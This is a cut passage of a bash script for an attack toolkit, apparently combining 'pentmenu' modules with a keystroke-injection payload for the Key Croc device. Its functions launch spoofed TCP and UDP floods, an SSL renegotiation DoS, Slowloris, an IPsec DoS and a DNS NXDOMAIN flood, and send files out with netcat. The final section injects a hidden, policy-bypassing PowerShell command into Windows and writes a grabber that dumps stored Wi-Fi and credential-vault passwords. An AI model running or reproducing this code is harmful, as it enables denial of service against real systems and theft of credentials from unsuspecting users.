		#----need a valid target ip/hostname
		target_input
		#----need a valid target port
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----define source IP or use outgoing interface IP
		read_all 'Enter Source IP or use [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----How many packets to send per second?  default is 10k
		read_all 'Enter number of packets to send per second default is 10,000' ; RATE="$r_a"
		: ${RATE:=10000}
		#----default is 100k, so using default values will send 10k packets per second for 10 seconds
		read_all 'Enter total number of packets to send default is 100,000' ; TOTAL="$r_a"
		: ${TOTAL:=100000}
		ColorGreen 'Starting TCP XMAS Flood...\n'
		#----begin TCP RST flood using values defined earlier
		if [ "$SOURCE" = "i" ]; then
			nping --tcp --dest-port "$PORT" --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate "$RATE" -c "$TOTAL" -v-1 "$TARGET"
		else
			nping --tcp --dest-port "$PORT" --flags cwr,ecn,urg,ack,psh,rst,syn,fin --rate "$RATE" -c "$TOTAL" -v-1 -S "$SOURCE" "$TARGET"
		fi
	fi
}
##
#----Recon pentmenu START UDP FLOOD
##
udpflood() {
	Info_Screen '-UDP Flood uses hping3...checking for hping3...'
	#----check for hping on the local system
	if test -f "/usr/sbin/hping3"; then
		ColorGreen 'hping3 found, continuing!\n';
		#----hping3 is found, so use that for UDP Flood
		#----need a valid target IP/hostname
		target_input
		#----need a valid target UDP port
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----curently only accepts stdin.  Can't define a file to read from
		read_all 'Enter random string data to send' ; DATA="$r_a"
		#----what source IP should we write to sent packets?
		read_all 'Enter Source IP, or [r]andom or [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----start the attack using values defined earlier
		if [[ "$SOURCE" =~ $validate_ip ]]; then
			ColorGreen 'Starting UDP Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood --spoof "$SOURCE" --udp --sign "$DATA" -p "$PORT" "$TARGET"
		elif [ "$SOURCE" = "r" ]; then
			ColorGreen 'Starting UDP Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood --rand-source --udp --sign "$DATA" -p "$PORT" "$TARGET"
		elif [ "$SOURCE" = "i" ]; then
			ColorGreen 'Starting UDP Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood --udp --sign "$DATA" -p "$PORT" "$TARGET"
			#----if no valid source option is selected, use outgoing interface IP
		else
			ColorRed "Not a valid option! $(ColorYellow 'Using interface IP')\n"
			ColorGreen 'Starting UDP Flood. Use Ctrl c to end and return to menu\n'
			hping3 --flood --udp --sign "$DATA" -p "$PORT" "$TARGET"
		fi
	#----If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else
		ColorRed "hping3 not found :( $(ColorYellow 'trying nping instead')\n"
		ColorYellow 'Trying UDP Flood with nping..\n'
		#----need a valid target IP/hostname
		target_input
		#----need a port to send UDP packets to
		target_input_port
		: ${PORT:=80}
		dos_port_check
		#----what source address should we use in sent packets?
		read_all 'Enter Source IP or use [i]nterface IP default' ; SOURE="$r_a"
		: ${SOURCE:=i}
		#----how many packets should we try to send each second?
		read_all 'Enter number of packets to send per second default is 10,000' ; RATE="$r_a"
		: ${RATE:=10000}
		#----how many packets should we send in total?
		read_all 'Enter total number of packets to send default is 100,000' ; TOTAL="$r_a"
		: ${TOTAL:=100000}
		#----default values will send 10k packets each second, for 10 seconds
		#----curently only accepts stdin.  Can't define a file to read from
		read_all 'Enter string to send data' ; DATA="$r_a"
		ColorGreen 'Starting UDP Flood...\n'
		#----start the UDP flood using values we defined earlier
		if [ "$SOURCE" = "i" ]; then
			nping --udp --dest-port "$PORT" --data-string "$DATA" --rate "$RATE" -c "$TOTAL" -v-1 "$TARGET"
		else
			nping --udp --dest-port "$PORT" --data-string "$DATA" --rate "$RATE" -c "$TOTAL" -v-1 -S "$SOURCE" "$TARGET"
		fi
	fi
}
##
#----Recon pentmenu START SSL DOS
##
ssldos() {
	Info_Screen '-Using openssl for SSL/TLS DOS'
	#----need a target IP/hostname
	target_input
	#----need a target port
	read_all 'Enter target port defaults to 443' ; PORT="$r_a"
	: ${PORT:=443}
	#----check a valid target port is entered otherwise assume port 443
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=443 && ColorRed "You provided a string, not a port number! $(ColorYellow 'Reverting to port 443')\n"
	fi
	if [ "$PORT" -lt "1" ]; then
		PORT=443 && ColorRed "Invalid port number chosen! $(ColorYellow 'Reverting to port 443')\n"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=443 && ColorRed "Invalid port number chosen! $(ColorYellow 'Reverting to port 443')\n"
	else
		ColorYellow "Using port: $PORT\n"
	fi
	#----do we want to use client renegotiation?
	read_all 'Use client renegotiation? [y]es or [n]o default' ; NEGOTIATE="$r_a"
	: ${NEGOTIATE:=n}
	if [[ $NEGOTIATE = y ]]; then
		#----if client renegotiation is selected for use, launch the attack supporting it
		ColorGreen 'Starting SSL DOS attack...Use Ctrl c to quit\n' && sleep 1
		while : for i in {1..10}; do
			echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect "$TARGET":"$PORT" 2>/dev/null 1>/dev/null &
		done
	elif [[ $NEGOTIATE = n ]]; then
		#----if client renegotiation is not requested, lauch the attack without support for it
		ColorGreen 'Starting SSL DOS attack...Use Ctrl c to quit\n' && sleep 1
		while : for i in {1..10}; do
			echo "spawning instance"; openssl s_client -connect "$TARGET":"$PORT" 2>/dev/null 1>/dev/null &
		done
	#----if an invalid option is chosen for client renegotiation, launch the attack without it
	else
		ColorRed 'Invalid option, assuming no client renegotiation\n'
		ColorGreen 'Starting SSL DOS attack...Use Ctrl c to quit\n' && sleep 1
		while : for i in {1..10}; do
			echo "spawning instance"; openssl s_client -connect "$TARGET":"$PORT" 2>/dev/null 1>/dev/null &
		done
	fi
}
##
#----Recon pentmenu START SLOW LORIS
##
slowloris() {
	Info_Screen '-Using netcat for Slowloris attack....' && sleep 1
	#----need a target IP or hostname
	target_input
	#----need a target port
	target_input_port
	: ${PORT:=80}
	dos_port_check
	#----how many connections should we attempt to open with the target?
	#----there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
	read_all 'Enter number of connections to open default 2000' ; CONNS="$r_a"
	: ${CONNS:=2000}
	#----ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
		CONNS=2000 && ColorRed "Invalid integer! $(ColorYellow 'Using 2000 connections')\n"
	fi
	#----how long do we wait between sending header lines?
	#----too long and the connection will likely be closed
	#----too short and our connections have little/no effect on server
	#----either too long or too short is bad.  Default random interval is a sane choice
	ColorYellow 'Choose interval between sending headers.\n'
	read_all 'Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds' ; INTERVAL="$r_a"
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]; then
		#----if default (random) interval is chosen, generate a random value between 5 and 15
		#----note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
		INTERVAL=$((RANDOM % 11 + 5))
		#----check that r (random) or a valid number is entered
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]; then
		#----if not r (random) or valid number is chosen for interval, assume r (random)
		INTERVAL=$((RANDOM % 11 + 5)) ColorRed "Invalid integer! $(ColorYellow 'Using random value between 5 and 15 seconds')\n"
	fi
	#----run stunnel_client function
	stunnel_client
	if [[ "$SSL" = "y" ]]; then
		#----if SSL is chosen, set the attack to go through local stunnel listener
		ColorGreen 'Launching Slowloris....Use Ctrl c to exit prematurely\n' && sleep 1
		i=1
		while [ "$i" -le "$CONNS" ]; do
			ColorYellow "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds\n"
			echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i "$INTERVAL" -w 30000 "$LHOST" "$LPORT" 2>/dev/null 1>/dev/null & i=$((i + 1))
		done
		ColorYellow "Opened $CONNS connections....returning to menu\n"
	else
		#----if SSL is not chosen, launch the attack on the server without using a local listener
		ColorGreen 'Launching Slowloris....Use Ctrl c to exit prematurely\n' && sleep 1
		i=1
		while [ "$i" -le "$CONNS" ]; do
			ColorYellow "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds\n"
			echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i "$INTERVAL" -w 30000 "$TARGET" "$PORT" 2>/dev/null 1>/dev/null & i=$((i + 1))
		done
		#----return to menu once requested number of connections has been opened or resources are exhausted
		ColorYellow "Opened $CONNS connections....returning to menu\n"
	fi
}
##
#----Recon pentmenu START IPSEC DOS
##
ipsecdos() {
	Info_Screen '-This module will attempt to spoof an IPsec server, with a spoofed source address'
	target_input
	#----launch DOS with a random source address by default
	ColorGreen 'IPsec DOS underway...use Ctrl C to stop\n' &&
	while : ; do
		ike-scan -A -B 100M -t 1 --sourceip=random "$TARGET" 1>/dev/null; ike-scan -B 100M -t 1 -q --sourceip=random "$TARGET" 1>/dev/null
	done
}
##
#----Recon pentmenu START DISTRACTION
##
distractionscan() {
	Info_Screen '-This module will send a TCP SYN scan with a spoofed source address"
-This module is designed to be obvious, to distract your target from any real scan
-or other activity you may actually be performing'
	#----need target IP/hostname
	target_input
	#----need a spoofed source address
	read_all 'Enter spoofed source address' ; SOURE="$r_a"
	#----use hping to perform multiple obvious TCP SYN scans
	for i in {1..50}; do
		ColorGreen "sending scan $i" && hping3 --scan all --spoof "$SOURCE" -S "$TARGET" 2>/dev/null 1>/dev/null
	done
}
##
#----Recon pentmenu START NXDOMAIN FLOOD
##
nxdomainflood() {
	Info_Screen '-This module is designed to stress test a DNS server by flooding it with queries
-for domains that do not exist'
	read_all 'Enter the IP address of the target DNS server' ; DNSTARGET="$r_a"
	ColorGreen "Starting DNS NXDOMAIN Query Flood to $DNSTARGET\n" && sleep 1
	ColorYellow 'No output will be shown. Use Ctrl c to stop!\n'
	#loop forever!
	while : ; do
		#create transaction ID for DNS query
		TRANS=$(( RANDOM ))
		#convert to hex
		printf -v TRANSID "%x\n" "$TRANS"
		#cut it into bytes
		TRANSID1=$(echo $TRANSID | cut -b 1,2 | xargs)
		TRANSID2=$(echo $TRANSID | cut -b 3,4 | xargs)
		#if single byte or no byte, prepend 0
		if [[ ${#TRANSID1} = "1" ]]; then
			TRANSID1=0$TRANSID
		elif [[ ${#TRANSID2} = "0" ]]; then
			TRANSID2=00
		elif [[ ${#TRANSID2} = "1" ]]; then
			TRANSID2=0$TRANSID
		fi
		#now we have transaction ID, generate random alphanumeric name to query
		TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de $RANDOM foo)
		TLD="${TLDLIST[ $(expr $(( RANDOM )) \% ${#TLDLIST[*]}) ]}"
		RANDLONG=$(( RANDOM % 20 + 1 ))
		STRING=$(< /dev/urandom tr -cd '[:alnum:]' | head -c $RANDLONG)
		#calculate length of name we are querying as hex
		STRINGLEN=(${#STRING})
		printf -v STRINGLENHEX "%x\n" "$STRINGLEN"
		STRINGLENHEX=$(echo "$STRINGLENHEX" | xargs)
		if [[ ${#STRINGLENHEX} = "1" ]]; then
			STRINGLENHEX=0$STRINGLENHEX
		fi
		#do the same for TLD
		TLDLEN=(${#TLD})
		printf -v TLDLENHEX "%x\n" "$TLDLEN"
		TLDLENHEX=$(echo "$TLDLENHEX" | xargs)
		#forge a DNS request and send to netcat
		ATTACKSTRING="\x$TRANSID1\x$TRANSID2\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x$STRINGLENHEX$STRING\x$TLDLENHEX$TLD\x00\x00\x01\x00\x01"
		#echo $ATTACKSTRING
		echo -ne "$ATTACKSTRING" | nc -u -w 1 "$DNSTARGET" 53
	done
}
##
#----Recon pentmenu EXTRACTION menu
##
extractionmenu() {
	Info_Screen '-EXTRACTION MODULES
-Send File This module uses netcat to send data with TCP or UDP.
-Listener - uses netcat to open a listener on a configurable TCP or UDP port.'
	MenuTitle 'EXTRACTION MENU'
	MenuColor 20 1 'SEND FILE'
	MenuColor 20 2 'CREATE LISTENER'
	MenuColor 20 3 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) sendfile ; mainmenu ;;
		2) listener ; mainmenu ;;
		3) mainmenu ;;
		0) exit ;;
		lock) Lock_keyboard ; extractionmenu ;;
		[pP]) Panic_button ;; [bB]) mainmenu ;; *) invalid_entry ; extractionmenu ;;
	esac
}
##
#----Recon pentmenu START SENDFILE
##
sendfile() {
	Info_Screen '-This module will allow you to send a file over TCP or UDP
-You can use the Listener to receive such a file'
	read_all 'Enter protocol, [t]cp default or [u]dp' ; PROTO="$r_a"
	: ${PROTO:=t}
	#----if not t (tcp) or u (udp) is chosen, assume tcp required
	if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
		ColorRed "Invalid protocol option selected, $(ColorYellow 'assuming tcp!')\n" && PROTO=t && echo ""
	fi
	#----need to know the IP of the receiving end
	read_all 'Enter the IP of the receving server' ; RECEIVER="$r_a"
	#----need to know a destination port on the server
	target_input_port
	: ${PORT:=80}
	dos_port_check
	#----what file are we sending?
	read_all 'Enter the FULL PATH of the file you want to extract' ; EXTRACT="$r_a"
	#----send the file
	ColorGreen "Sending the file to $RECEIVER: $PORT\n"
	if [ "$PROTO" = "t" ]; then
		nc -w 3 -n -N "$RECEIVER" "$PORT" < "$EXTRACT"
	else
		nc -n -N -u "$RECEIVER" "$PORT" < "$EXTRACT"
	fi
	echo "Done"
	#----generate hashes of file we are sending
	ColorYellow 'Generating hash checksum\n'
	md5sum "$EXTRACT"
	echo ""
	sha512sum "$EXTRACT"
	sleep 1
}
##
#----Recon pentmenu START LISTENER
##
listener() {
	Info_Screen '-This module will create a TCP or UDP listener using netcat
-Any data string or file received will be written out to ./pentmenu.listener.out'
	read_all 'Enter protocol, [t]cp default or [u]dp' ; PROTO="$r_a"
	: ${PROTO:=t}
	#----if not t (tcp) or u (udp) is chosen, assume tcp listener required
	if [ "$PROTO" != "t" ] && [ "$PROTO" != "u" ]; then
		ColorRed "Invalid protocol option selected, $(ColorYellow 'assuming tcp!')\n" && PROTO=t && echo ""
	fi
	#----show listening ports on system using ss (if available) otherwise use netstat
	Info_Screen '-Listing current listening ports on this system.
-Do not attempt to create a listener on one of these ports, it will not work.'
	if test -f "/bin/ss"; then
		LISTPORT=ss;
	else
		LISTPORT=netstat
	fi
	#----now we can ask what port to create listener on
	#----it cannot of course listen on a port already in use
	$LISTPORT -$PROTO -n -l
	read_all 'Enter port number to listen on defaults to 8000' ; PORT="$r_a"
	: ${PORT:=8000}
	#----if not an integer is entered, assume default port 8000
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
		PORT=8000 && ColorRed "You provided a string, not a port number! $(ColorYellow 'Reverting to port 8000')\n"
	fi
	#----ensure a valid port number, between 1 and 65,535 (inclusive) is entered
	if [ "$PORT" -lt "1" ]; then
		PORT=8000 && ColorRed "Invalid port number chosen! $(ColorYellow 'Reverting to port 8000')\n"
	elif [ "$PORT" -gt "65535" ]; then
		PORT=8000 && ColorRed "Invalid port number chosen! $(ColorYellow 'Reverting to port 8000')\n"
	fi
	#----define where to save everything received to the listener
	read_all 'Enter output file defaults to pentmenu.listener.out' ; OUTFILE="$r_a"
	: ${OUTFILE:=pentmenu.listener.out}
	ColorYellow 'Use ctrl c to stop\n'
	#----create the listener
	if [ "$PROTO" = "t" ] && [ "$PORT" -lt "1025" ]; then
		nc -n -l -v -p "$PORT" > "$OUTFILE"
	elif [ "$PROTO" = "t" ] && [ "$PORT" -gt "1024" ]; then
		nc -n -l -v -p "$PORT" > "$OUTFILE"
	elif [ "$PROTO" = "u" ] && [ "$PORT" -lt "1025" ]; then
		nc -n -u -k -l -v -p "$PORT" > "$OUTFILE"
	elif [ "$PROTO" = "u" ] && [ "$PORT" -gt "1024" ]; then
		nc -n -u -k -l -v -p "$PORT" > "$OUTFILE"
	fi
	#----done message and checksum will only work for tcp file transfer
	#----with udp, the connection has to be manually closed with 'ctrl C'
	sync && ColorGreen 'Done\n'
	#----generate hashes of file received
	ColorGreen 'Generating hash checksum\n'
	md5sum "$OUTFILE"
	echo ""
	sha512sum "$OUTFILE"
	sleep 1
}
##
#----Recon pentmenu START SHOW README
##
#----use curl to show the readme file
showreadme() {
	user_agent_random
	curl -s -A "$userAgent" https://raw.githubusercontent.com/GinjaChris/pentmenu/master/README.md | more
}
##
#----Recon pentmenu START STUNNEL
##
stunnel_client() {
	read_all 'use SSL/TLS? [y]es or [n]o default' ; SSL="$r_a"
	: ${SSL:=n}
	#----if not using SSL/TLS, carry on what we were doing
	#----otherwise create an SSL/TLS tunnel using a local listener on TCP port 9991
	if [[ "$SSL" = "y" ]]; then
		ColorYellow 'Using SSL/TLS\n'
		LHOST=127.0.0.1
		LPORT=9991
		#----ascertain if stunnel is defined in /etc/services and if not, add it & set permissions correctly
		grep -q "$LPORT" /etc/services
		if [[ $? = 1 ]]; then
			echo "Adding pentmenu stunnel service to /etc/services" && chmod 777 /etc/services && echo "pentmenu-stunnel-client 9991/tcp #pentmenu stunnel client listener" >> /etc/services && chmod 644 /etc/services
		fi
		#----is ss is available, use that to show listening ports
		if test -f "/bin/ss"; then
			LISTPORT=ss;
		#otherwise use netstat
		else
			LISTPORT=netstat
		fi
		#----show listening ports and check for port 9991
		$LISTPORT -tln | grep -q $LPORT
		if [[ "$?" = "1" ]]; then
			#----if nothing is running on port 9991, create stunnel configuration
			ColorYellow "Creating stunnel client on: $LHOST:$LPORT\n"
			rm -f /etc/stunnel/pentmenu.conf;
			touch /etc/stunnel/pentmenu.conf && chmod 777 /etc/stunnel/pentmenu.conf
			echo "[PENTMENU-CLIENT]" >> /etc/stunnel/pentmenu.conf
			echo "client=yes" >> /etc/stunnel/pentmenu.conf
			echo "accept=$LHOST:$LPORT" >> /etc/stunnel/pentmenu.conf
			echo "connect=$TARGET:$PORT" >> /etc/stunnel/pentmenu.conf
			echo "verify=0" >> /etc/stunnel/pentmenu.conf
			chmod 644 /etc/stunnel/pentmenu.conf
			stunnel /etc/stunnel/pentmenu.conf && sleep 1
		#----if stunnel listener is already active we don't bother recreating it
		else
			ColorYellow 'Looks like stunnel is already listening on port 9991, so not recreating\n'
		fi
	fi
}
mainmenu
}
##
#----Windows Info Grabber Scan Bash Bunny payload
##
function windows_check() {
	Info_Screen '-This is an Bash Bunny payload Info Grabber
-Big Thanks Simen Kjeserud Original AUTHOR, Gachnang, DannyK999
-https://github.com/hak5/bashbunny-payloads
-This will Scan an Windows pc and collect alot of information
-WINDOWS SCAN CAN TAKE UP TO 1 MIN TO RUN
-Save to loot/Croc_pot folder'
if [ "$(OS_CHECK)" = WINDOWS ]; then
	read_all 'START WINDOWS INFO GRABBER Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
		local LOOT_WIND=/root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt
		local WIN_PS=/root/udisk/tools/Croc_Pot/run.ps1
		local WIN_PS_A=/root/udisk/tools/Croc_Pot/info.ps1
		start_win_stat() {
		rm -f "$LOOT_WIND"
		ATTACKMODE HID STORAGE
		sleep 5 ; QUACK GUI r ; sleep 1 ; LED ATTACK ; QUACK STRING "powershell -nop -ex Bypass -w Hidden" ; QUACK ENTER ; sleep 5
		QUACK STRING ".((gwmi win32_volume -f 'label=''KeyCroc''').Name+'tools\Croc_Pot\run.ps1')" ; QUACK ENTER ; sleep 45
		QUACK STRING "exit" ; QUACK ENTER ; ATTACKMODE HID ; LED FINISH ; sleep 3
		LED OFF
	}
		if [[ -e "$WIN_PS" && "$WIN_PS_A" ]]; then
			start_win_stat | tee "$LOOT_WIND"
			cat "$LOOT_WIND"
		else
			sleep 1
			echo -ne "powershell \"Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue\"\n\n\$VolumeName = \"KeyCroc\"\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$backupDrive = \$null\nGet-WmiObject win32_logicaldisk | % {\n
if (\$_.VolumeName -eq \$VolumeName) {\n        \$backupDrive = \$_.DeviceID\n    }\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n    New-Item -ItemType directory -Path \$TARGETDIR\n}\n\n\$TARGETDIR = \$backupDrive + \"\loot\Croc_Pot\"\nif(!(Test-Path -Path \$TARGETDIR )){\n   New-Item -ItemType directory -Path \$TARGETDIR\n}\n
\$backupPath = \$backupDrive + \"\loot\Croc_Pot\" + \"\KeyCroc_Wind_Log\" + \".txt\"\n\$TARGETDIR = \$MyInvocation.MyCommand.Path\n\$TARGETDIR = \$TARGETDIR -replace \".......\$\"\ncd \$TARGETDIR\nPowerShell.exe -ExecutionPolicy Bypass -File info.ps1 > \$backupPath" >> ${WIN_PS}
			echo -ne "try\n{\n\$computerPubIP = (Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content\n}\ncatch\n{\n\$computerPubIP = \"Error getting Public IP\"\n}\n\$computerIP = Get-WmiObject Win32_NetworkAdapterConfiguration | Where {\$_.Ipaddress.length -gt 1}\n\$IsDHCPEnabled = \$False\n
\$Networks = Get-WmiObject Win32_NetworkAdapterConfiguration -Filter \"DHCPEnabled=\$True\" | ? {\$_.IPEnabled}\nforeach (\$Network in \$Networks) {\nIf(\$network.DHCPEnabled) {\n\$IsDHCPEnabled = \$True\n  }\n[string[]]\$computerMAC = \$Network.MACAddress\n}\n\n\$computerSystem = Get-CimInstance CIM_ComputerSystem\n\$computerBIOS = Get-CimInstance CIM_BIOSElement\n
\$computerOs = Get-WmiObject Win32_operatingsystem | select Caption, CSName, Version, @{Name=\"InstallDate\";Expression={([WMI]'').ConvertToDateTime(\$_.InstallDate)}} , @{Name=\"LastBootUpTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LastBootUpTime)}}, @{Name=\"LocalDateTime\";Expression={([WMI]'').ConvertToDateTime(\$_.LocalDateTime)}}, CurrentTimeZone, CountryCode, OSLanguage, SerialNumber, WindowsDirectory | Format-List\n\$computerCpu = Get-WmiObject Win32_Processor | select DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List\n\$computerMainboard = Get-WmiObject Win32_BaseBoard | Format-List\n
\$computerRamCapacity = Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { \"{0:N1} GB\" -f (\$_.sum / 1GB)}\n\$computerRam = Get-WmiObject Win32_PhysicalMemory | select DeviceLocator, @{Name=\"Capacity\";Expression={ \"{0:N1} GB\" -f (\$_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table\n\n\$driveType = @{\n   2=\"Removable disk \"\n   3=\"Fixed local disk \"\n   4=\"Network disk \"\n   5=\"Compact disk \"}\n
\$Hdds = Get-WmiObject Win32_LogicalDisk | select DeviceID, VolumeName, @{Name=\"DriveType\";Expression={\$driveType.item([int]\$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name=\"Size_GB\";Expression={\"{0:N1} GB\" -f (\$_.Size / 1Gb)}}, @{Name=\"FreeSpace_GB\";Expression={\"{0:N1} GB\" -f (\$_.FreeSpace / 1Gb)}}, @{Name=\"FreeSpace_percent\";Expression={\"{0:N1}%\" -f ((100 / (\$_.Size / \$_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name=\"Size GB\"; Expression={\$_.Size_GB}; align=\"right\"; }, @{ Name=\"FreeSpace GB\"; Expression={\$_.FreeSpace_GB}; align=\"right\"; }, @{ Name=\"FreeSpace %\"; Expression={\$_.FreeSpace_percent}; align=\"right\"; }\n
\$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi](\$_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table\n\n\$RDP\nif ((Get-ItemProperty \"hklm:\System\CurrentControlSet\Control\Terminal Server\").fDenyTSConnections -eq 0) {\n    \$RDP = \"RDP is Enabled\"\n} else {\n    \$RDP = \"RDP is NOT Enabled\"\n}\n\n\$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { \$_.MACAddress -notlike \$null } | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress\n
\$WLANProfileNames = @()\n\$Output = netsh.exe wlan show profiles | Select-String -pattern \":\"\nForeach(\$WLANProfileName in \$Output){\n    \$WLANProfileNames += ((\$WLANProfileName -split \":\")[1]).Trim()\n}\n\$WLANProfileObjects = @()\n
Foreach(\$WLANProfileName in \$WLANProfileNames){\n    try{\n        \$WLANProfilePassword = (((netsh.exe wlan show profiles name=\"\$WLANProfileName\" key=clear | select-string -Pattern \"Key Content\") -split \":\")[1]).Trim()\n    } Catch {\n        \$WLANProfilePassword = \"The password is not stored in this profile\"\n    }\n    \$WLANProfileObject = New-Object PSCustomobject\n    \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfileName\" -Value \$WLANProfileName\n
        \$WLANProfileObject | Add-Member -Type NoteProperty -Name \"ProfilePassword\" -Value \$WLANProfilePassword\n    \$WLANProfileObjects += \$WLANProfileObject\n    Remove-Variable WLANProfileObject\n}\n\n\$luser = Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID\n
    \$process = Get-WmiObject Win32_process | select Handle, ProcessName, ExecutablePath, CommandLine\n\n\$listener = Get-NetTCPConnection | select @{Name=\"LocalAddress\";Expression={\$_.LocalAddress + \":\" + \$_.LocalPort}}, @{Name=\"RemoteAddress\";Expression={\$_.RemoteAddress + \":\" + \$_.RemotePort}}, State, AppliedSetting, OwningProcess\n\$listener = \$listener | foreach-object {\n    \$listenerItem = \$_\n    \$processItem = (\$process | where { [int]\$_.Handle -like [int]\$listenerItem.OwningProcess })\n
        new-object PSObject -property @{\n      \"LocalAddress\" = \$listenerItem.LocalAddress\n      \"RemoteAddress\" = \$listenerItem.RemoteAddress\n      \"State\" = \$listenerItem.State\n      \"AppliedSetting\" = \$listenerItem.AppliedSetting\n
          \"OwningProcess\" = \$listenerItem.OwningProcess\n      \"ProcessName\" = \$processItem.ProcessName\n    }\n} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table\n\n\$process = \$process | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine\n\n\$service = Get-WmiObject Win32_service | select State, Name, DisplayName, PathName, @{Name=\"Sort\";Expression={\$_.State + \$_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName\n
\$software = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { \$_.DisplayName -notlike \$null } | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize\n
\$drivers = Get-WmiObject Win32_PnPSignedDriver | where { \$_.DeviceName -notlike \$null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion\n\n\$videocard = Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution\n\n[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]\n\$vault = New-Object Windows.Security.Credentials.PasswordVault\n\$vault = \$vault.RetrieveAll() | % { \$_.RetrievePassword();\$_ }\n
Clear-Host\nWrite-Host\n\n\$computerSystem.Name\n\"${LINE}\"\n\"Manufacturer: \" + \$computerSystem.Manufacturer\n\"Model: \" + \$computerSystem.Model\n\"Serial Number: \" + \$computerBIOS.SerialNumber\n\"\"\n\"\"\n\"\"\n\n\"OS:\"\n\"${LINE}\"+ (\$computerOs | out-string)\n
\"CPU:\"\n\"${LINE}\"+ (\$computerCpu | out-string)\n\n\"RAM:\"\n\"${LINE}\"\n\"Capacity:\" + \$computerRamCapacity+ (\$computerRam | out-string)\n\n\"Mainboard:\"\n\"${LINE}\"+ (\$computerMainboard | out-string)\n\n\"Bios:\"\n\"${LINE}\"+ (Get-WmiObject Win32_bios | out-string)\n\n\"Local-user:\"\n\"${LINE}\"+ (\$luser | out-string)\n\n\"HDDs:\"\n\"${LINE}\"+ (\$Hdds | out-string)\n\n\"COM & SERIAL DEVICES:\"\n\"${LINE}\"+ (\$COMDevices | Out-String)\n\n\"Network:\"\n\"${LINE}\"\n\"Computers MAC address: \" + \$computerMAC\n\"Computers IP address: \" + \$computerIP.ipaddress[0]\n\"Public IP address: \" + \$computerPubIP\n
\"RDP: \" + \$RDP\n\"\"\n(\$Network | out-string)\n\n\"W-Lan profiles:\"\n\"${LINE}\"+ (\$WLANProfileObjects | out-string)\n\n\"listeners / ActiveTcpConnections:\"\n\"${LINE}\"+ (\$listener | out-string)\n\n\"Current running process:\"\n\"${LINE}\"+ (\$process | out-string)\n
